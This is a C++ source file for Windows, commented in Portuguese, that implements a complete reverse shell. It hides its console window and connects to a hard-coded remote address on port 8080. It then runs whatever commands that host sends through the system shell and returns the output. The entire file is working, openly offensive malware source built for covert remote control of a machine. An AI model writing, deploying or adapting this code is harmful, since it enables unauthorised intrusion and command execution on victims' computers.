#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <string>
#include <stdexcept>
#include <cstdio>
#include <memory>

#pragma comment(lib, "Ws2_32.lib")

// ======================
// Exceção personalizada
// ======================
class WinAPIException : public std::runtime_error {
public:
    WinAPIException(const std::string& message, DWORD errorCode = GetLastError())
        : std::runtime_error(message + " (Error: " + std::to_string(errorCode) + ")") {}
};

// ======================
// Interface de comunicação
// ======================
class ICommunicationHandler {
public:
    virtual void connect(const char* ip, int port) = 0;
    virtual int receive(char* buffer, int bufferSize) = 0;
    virtual void send(const std::string& data) = 0;
    virtual ~ICommunicationHandler() = default;
};

// ======================
// Gerenciador de Winsock
// ======================
class WinsockManager {
public:
    WinsockManager() {
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            throw WinAPIException("Falha na inicializacao do Winsock");
        }
    }

    ~WinsockManager() {
        WSACleanup();
    }

    WinsockManager(const WinsockManager&) = delete;
    WinsockManager& operator=(const WinsockManager&) = delete;
};

// ======================
// Implementação de Socket TCP
// ======================
class TcpSocket : public ICommunicationHandler {
    SOCKET socket_ = INVALID_SOCKET;
    
public:
    TcpSocket() {
        socket_ = ::socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (socket_ == INVALID_SOCKET) {
            throw WinAPIException("Falha ao criar socket");
        }
    }

    ~TcpSocket() { 
        if (socket_ != INVALID_SOCKET) closesocket(socket_); 
    }
    
    void connect(const char* ip, int port) override {
        sockaddr_in address{};
        address.sin_family = AF_INET;
        address.sin_port = htons(port);
        inet_pton(AF_INET, ip, &address.sin_addr);

        if (::connect(
            socket_,
            reinterpret_cast<SOCKADDR*>(&address),
            sizeof(address)) == SOCKET_ERROR) {
            throw WinAPIException("Falha na conexao");
        }
    }
    
    int receive(char* buffer, int bufferSize) override {
        int bytesReceived = recv(socket_, buffer, bufferSize - 1, 0);
        if (bytesReceived == SOCKET_ERROR) {
            throw WinAPIException("Falha na recepcao de dados");
        }
        return bytesReceived;
    }
    
    void send(const std::string& data) override {
        if (::send(socket_, data.c_str(), static_cast<int>(data.size()), 0) == SOCKET_ERROR) {
            throw WinAPIException("Falha no envio de dados");
        }
    }
};

// ======================
// Interface de executor de comandos
// ======================
class ICommandExecutor {
public:
    virtual std::string execute(const std::string& command) = 0;
    virtual ~ICommandExecutor() = default;
};

// ======================
// Executor de comandos do sistema
// ======================
class SystemCommandExecutor : public ICommandExecutor {
public:
    std::string execute(const std::string& command) override {
        std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(command.c_str(), "r"), _pclose);
        if (!pipe) throw WinAPIException("Falha ao executar comando");

        std::string result;
        char buffer[1024];
        while (fgets(buffer, sizeof(buffer), pipe.get())) {
            result += buffer;
        }
        return result;
    }
};

// ======================
// Gerenciador de console
// ======================
class ConsoleManager {
public:
    static void hide() {
        if (HWND console = GetConsoleWindow()) {
            ShowWindow(console, SW_HIDE);
        }
    }
};

// ======================
// Shell reversa
// ======================
class ReverseShell {
    WinsockManager winsockManager_;
    std::unique_ptr<ICommunicationHandler> communication_;
    std::unique_ptr<ICommandExecutor> executor_;
    
    static constexpr int BUFFER_SIZE = 1024;
    
public:
    ReverseShell(std::unique_ptr<ICommunicationHandler> commHandler, 
                 std::unique_ptr<ICommandExecutor> cmdExecutor)
        : communication_(std::move(commHandler)),
          executor_(std::move(cmdExecutor)) {}
    
    void run() {
        char commandBuffer[BUFFER_SIZE];
        
        while (true) {
            try {
                int bytesReceived = communication_->receive(commandBuffer, BUFFER_SIZE);
                if (bytesReceived <= 0) break;
                
                commandBuffer[bytesReceived] = '\0';
                std::string command = commandBuffer;
                
                std::string output;
                try {
                    output = executor_->execute(command);
                } 
                catch (const std::exception& e) {
                    output = "[ERRO] " + std::string(e.what()) + "\n";
                }
                
                communication_->send(output);
            } 
            catch (const WinAPIException&) {
                break;
            }
        }
    }
};

// ======================
// Fábrica de componentes
// ======================
class ReverseShellFactory {
public:
    static std::unique_ptr<ReverseShell> create(const char* ip, int port) {
        // Criar comunicação
        auto commHandler = std::make_unique<TcpSocket>();
        commHandler->connect(ip, port);
        
        // Criar executor de comandos
        auto executor = std::make_unique<SystemCommandExecutor>();
        
        return std::make_unique<ReverseShell>(std::move(commHandler), std::move(executor));
    }
};

// ======================
// Ponto de entrada
// ======================
int main() {
    ConsoleManager::hide();
    
    try {
        auto shell = ReverseShellFactory::create("192.168.0.X", 8080);
        shell->run();
        return 0;
    } 
    catch (...) { 
        return 1; 
    }
}
